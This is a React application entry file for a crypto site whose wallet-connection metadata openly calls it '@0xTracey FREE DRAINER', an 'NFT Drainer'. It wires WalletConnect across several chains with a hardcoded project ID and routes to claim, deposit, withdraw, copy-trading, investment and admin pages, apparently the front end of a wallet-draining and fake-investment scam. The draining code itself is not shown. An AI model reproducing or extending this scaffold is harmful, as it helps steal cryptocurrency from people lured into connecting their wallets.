import React from 'react'
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react'
import { WagmiConfig } from 'wagmi'
import { mainnet, polygon, bsc, arbitrum } from 'wagmi/chains'
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom'
import { AuthProvider } from './contexts/AuthContext'
import Navigation from './components/Navigation'
import HomePage from './components/HomePage'
import ClaimPage from './components/ClaimPage'
import Dashboard from './components/Dashboard'
import CopyTrading from './components/CopyTrading'
import Investments from './components/Investments'
import Deposit from './components/Deposit'
import Withdrawal from './components/Withdrawal'
import Transactions from './components/Transactions'
import Profile from './components/Profile'
import AdminDashboard from './components/AdminDashboard'
import './App.css'

// WalletConnect Project ID
const projectId = '8978f301642afe033dcdcd7b9b9fcec1'

// Define chains
const chains = [mainnet, polygon, bsc, arbitrum]

// Create wagmi config
const metadata = {
  name: '@0xTracey FREE DRAINER',
  description: 'NFT Drainer',
  url: window.location.origin,
  icons: ['https://avatars.githubusercontent.com/u/37784886']
}

// Enhanced configuration with better error handling
const wagmiConfig = defaultWagmiConfig({ 
  chains, 
  projectId, 
  metadata,
  enableWalletConnect: true,
  enableInjected: true,
  enableEIP6963: true,
  enableCoinbase: true,
  // Add WalletConnect options for better reliability
  walletConnectOptions: {
    relayUrl: 'wss://relay.walletconnect.org', // Fallback relay
    projectId: projectId,
  }
})

// Create Web3Modal with enhanced configuration
createWeb3Modal({ 
  wagmiConfig, 
  projectId, 
  chains,
  themeVariables: {
    '--w3m-font-family': 'Anton, sans-serif',
    '--w3m-color-mix': '#000000',
    '--w3m-accent': '#000000'
  },
  // Enable additional features for better connectivity
  enableAnalytics: false, // Disable analytics for privacy
  featuredWalletIds: [], // Allow all wallets
  termsOfServiceUrl: '', // No terms of service
  privacyPolicyUrl: '' // No privacy policy
})

function App() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <AuthProvider>
        <Router>
          <div className="App">
            <Navigation />
            <Routes>
              <Route path="/" element={<HomePage />} />
              <Route path="/claim" element={<ClaimPage />} />
              <Route path="/dashboard" element={<Dashboard />} />
              <Route path="/copy-trading" element={<CopyTrading />} />
              <Route path="/investments" element={<Investments />} />
              <Route path="/deposit" element={<Deposit />} />
              <Route path="/withdraw" element={<Withdrawal />} />
              <Route path="/transactions" element={<Transactions />} />
              <Route path="/profile" element={<Profile />} />
              <Route path="/admin" element={<AdminDashboard />} />
              <Route path="/portfolio" element={<Dashboard />} />
            </Routes>
          </div>
        </Router>
      </AuthProvider>
    </WagmiConfig>
  )
}

export default App